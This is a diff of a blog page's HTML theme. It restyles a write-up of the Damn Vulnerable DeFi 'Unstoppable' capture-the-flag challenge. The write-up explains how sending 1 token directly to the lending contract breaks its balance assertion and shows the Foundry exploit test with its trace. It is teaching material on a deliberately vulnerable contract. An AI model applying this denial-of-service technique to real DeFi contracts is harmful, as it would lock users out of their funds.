@@ -91,7 +91,7 @@
 
 
 
-<body class="preload-transitions colorscheme-dark">
+<body class="preload-transitions colorscheme-auto">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -266,19 +266,19 @@ contract &ndash; stop the pool from offering flash loans.</li>
 <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard"  class="external-link" target="_blank" rel="noopener">ReentrancyGuard</a>
 and each <code>external</code> function has the <code>nonReentrant</code> modifier.
 Let&rsquo;s have a look at contract&rsquo;s state variables:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">IERC20</span> <span style="color:#728e00">public</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">damnValuableToken</span>;
-</span></span><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#728e00">public</span> <span style="color:#434f54">poolBalance</span>;
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>IERC20 <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">immutable</span> damnValuableToken;
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">public</span> poolBalance;
 </span></span></code></pre></div><ul>
 <li><code>damnValuableToken</code> is DVT ERC20 token.</li>
 <li><code>poolBalance</code> is used for accounting and stores the sum of all deposits.</li>
 </ul>
 <p>Now, let&rsquo;s go over external functions:</p>
 <p><strong>depositTokens</strong></p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">depositTokens</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> <span style="color:#434f54">nonReentrant</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">amount</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">MustDepositOneTokenMinimum</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Transfer token from sender. Sender must have first approved them.
-</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">damnValuableToken</span>.<span style="color:#434f54">transferFrom</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>), <span style="color:#434f54">amount</span>);
-</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">poolBalance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">poolBalance</span> <span style="color:#728e00">+</span> <span style="color:#434f54">amount</span>;
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> depositTokens(<span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">external</span> nonReentrant {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (amount == <span style="color:#ff0;font-weight:bold">0</span>) <span style="color:#fff;font-weight:bold">revert</span> MustDepositOneTokenMinimum();
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Transfer token from sender. Sender must have first approved them.
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    damnValuableToken.transferFrom(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>), amount);
+</span></span><span style="display:flex; background-color:#191919"><span>    poolBalance = poolBalance + amount;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><ul>
 <li>It requires the deposit of at least 1 DVT.</li>
@@ -291,24 +291,24 @@ the <code>poolBalance</code> storage variable instead of relying on the
 <code>dvt.balanceOf</code> function. Let&rsquo;s keep this in mind.</p>
 <p><strong>flashLoan</strong></p>
 <p>Our challenge is to disable this function. Let&rsquo; take a look at it:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#728e00">function</span> <span style="color:#d35400">flashLoan</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">borrowAmount</span>) <span style="color:#728e00">external</span> <span style="color:#434f54">nonReentrant</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">borrowAmount</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">MustBorrowOneTokenMinimum</span>();
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#fff;font-weight:bold">function</span> flashLoan(<span style="color:#fff;font-weight:bold">uint256</span> borrowAmount) <span style="color:#fff;font-weight:bold">external</span> nonReentrant {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (borrowAmount == <span style="color:#ff0;font-weight:bold">0</span>) <span style="color:#fff;font-weight:bold">revert</span> MustBorrowOneTokenMinimum();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">=</span> <span style="color:#434f54">damnValuableToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
-</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">borrowAmount</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotEnoughTokensInPool</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> balanceBefore = damnValuableToken.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (balanceBefore &lt; borrowAmount) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughTokensInPool();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Ensured by the protocol via the `depositTokens` function
-</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">poolBalance</span> <span style="color:#728e00">!=</span> <span style="color:#434f54">balanceBefore</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">AssertionViolated</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Ensured by the protocol via the `depositTokens` function
+</span></span></span><span style="display:flex; background-color:#191919"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (poolBalance != balanceBefore) <span style="color:#fff;font-weight:bold">revert</span> AssertionViolated();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">damnValuableToken</span>.<span style="color:#728e00">transfer</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">borrowAmount</span>);
+</span></span><span style="display:flex;"><span>    damnValuableToken.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, borrowAmount);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">IReceiver</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>).<span style="color:#434f54">receiveTokens</span>(
-</span></span><span style="display:flex;"><span>        <span style="color:#00979d">address</span>(<span style="color:#434f54">damnValuableToken</span>),
-</span></span><span style="display:flex;"><span>        <span style="color:#434f54">borrowAmount</span>
+</span></span><span style="display:flex;"><span>    IReceiver(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>).receiveTokens(
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">address</span>(damnValuableToken),
+</span></span><span style="display:flex;"><span>        borrowAmount
 </span></span><span style="display:flex;"><span>    );
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceAfter</span> <span style="color:#728e00">=</span> <span style="color:#434f54">damnValuableToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
-</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">balanceAfter</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">balanceBefore</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> balanceAfter = damnValuableToken.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (balanceAfter &lt; balanceBefore) <span style="color:#fff;font-weight:bold">revert</span> FlashLoanHasNotBeenPaidBack();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><ul>
 <li>It takes the <code>borrowAmount</code> argument.</li>
@@ -317,7 +317,7 @@ greater than or equal to the <code>borrowAmount</code>.</li>
 <li>It ensures that the <code>poolBalance</code> is equal to the <code>balanceBefore</code>.</li>
 </ul>
 <p>👀 The problem is this line:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">if</span> (<span style="color:#434f54">poolBalance</span> <span style="color:#728e00">!=</span> <span style="color:#434f54">balanceBefore</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">AssertionViolated</span>();
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> (poolBalance != balanceBefore) <span style="color:#fff;font-weight:bold">revert</span> AssertionViolated();
 </span></span></code></pre></div><p>It is possible to transfer ERC20 tokens to any EOA/contract.
 Hence we can directly send some DVT&rsquo;s to the <code>UnstoppableLender</code>
 (without calling the <code>depositTokens</code> function) and break the
@@ -330,42 +330,42 @@ equality check above.</p>
   </a>
 </h2>
 <p>Sending just 1 DVT is enough:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">testExploit</span>() <span style="color:#728e00">public</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT START **/</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">prank</span>(<span style="color:#434f54">attacker</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">dvt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">unstoppableLender</span>), <span style="color:#8a7b52">1</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT END **/</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">expectRevert</span>(<span style="color:#434f54">UnstoppableLender</span>.<span style="color:#434f54">AssertionViolated</span>.<span style="color:#728e00">selector</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">validation</span>();
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> testExploit() <span style="color:#fff;font-weight:bold">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT START **/</span>
+</span></span><span style="display:flex;"><span>    vm.prank(attacker);
+</span></span><span style="display:flex;"><span>    dvt.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">address</span>(unstoppableLender), <span style="color:#ff0;font-weight:bold">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT END **/</span>
+</span></span><span style="display:flex;"><span>    vm.expectRevert(UnstoppableLender.AssertionViolated.<span style="color:#fff;font-weight:bold">selector</span>);
+</span></span><span style="display:flex;"><span>    validation();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Here is the trace:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#728e00">test</span> --match-contract Unstoppable -vvvv
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#fff;font-weight:bold">test</span> --match-contract Unstoppable -vvvv
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Running <span style="color:#8a7b52">1</span> <span style="color:#728e00">test</span> <span style="color:#728e00">for</span> src/test/Levels/unstoppable/Unstoppable.t.sol:Unstoppable
-</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testExploit<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 44892<span style="color:#728e00">)</span>
+</span></span><span style="display:flex;"><span>Running <span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">test</span> <span style="color:#fff;font-weight:bold">for</span> src/test/Levels/unstoppable/Unstoppable.t.sol:Unstoppable
+</span></span><span style="display:flex;"><span>[PASS] testExploit() (gas: 44892)
 </span></span><span style="display:flex;"><span>Logs:
 </span></span><span style="display:flex;"><span>  🧨 PREPARED TO BREAK THINGS 🧨
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Traces:
-</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>44892<span style="color:#728e00">]</span> Unstoppable::testExploit<span style="color:#728e00">()</span>
-</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>Attacker: <span style="color:#728e00">[</span>0x9af2e2b7e57c1cd7c68c5c3796d8ea67e0018db7<span style="color:#728e00">])</span>
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
-</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>12870<span style="color:#728e00">]</span> DVT::transfer<span style="color:#728e00">(</span>Unstoppable Lender: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 1<span style="color:#728e00">)</span>
-</span></span><span style="display:flex;"><span>    │   ├─ emit Transfer<span style="color:#728e00">(</span>from: Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, to: Unstoppable Lender: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, value: 1<span style="color:#728e00">)</span>
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
-</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::expectRevert<span style="color:#728e00">(</span>AssertionViolated<span style="color:#728e00">())</span>
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
-</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>User: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
-</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>11550<span style="color:#728e00">]</span> Receiver Unstoppable::executeFlashLoan<span style="color:#728e00">(</span>10<span style="color:#728e00">)</span>
-</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>8416<span style="color:#728e00">]</span> Unstoppable Lender::flashLoan<span style="color:#728e00">(</span>10<span style="color:#728e00">)</span>
-</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>562<span style="color:#728e00">]</span> DVT::balanceOf<span style="color:#728e00">(</span>Unstoppable Lender: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
-</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#8a7b52">1000000000000000000000001</span>
-</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#7f8c8d">&#34;AssertionViolated()&#34;</span>
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#7f8c8d">&#34;AssertionViolated()&#34;</span>
-</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
-</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>  [44892] Unstoppable::testExploit()
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::prank(Attacker: [0x9af2e2b7e57c1cd7c68c5c3796d8ea67e0018db7])
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [12870] DVT::transfer(Unstoppable Lender: [...], 1)
+</span></span><span style="display:flex;"><span>    │   ├─ emit Transfer(from: Attacker: [...], to: Unstoppable Lender: [...], value: 1)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::expectRevert(AssertionViolated())
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(User: [...])
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [11550] Receiver Unstoppable::executeFlashLoan(10)
+</span></span><span style="display:flex;"><span>    │   ├─ [8416] Unstoppable Lender::flashLoan(10)
+</span></span><span style="display:flex;"><span>    │   │   ├─ [562] DVT::balanceOf(Unstoppable Lender: [...]) [staticcall]
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#ff0;font-weight:bold">1000000000000000000000001</span>
+</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#0ff;font-weight:bold">&#34;AssertionViolated()&#34;</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#0ff;font-weight:bold">&#34;AssertionViolated()&#34;</span>
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    └─ ← ()
 </span></span></code></pre></div><h2 id="remediation">
   Remediation
   <a class="heading-link" href="#remediation">
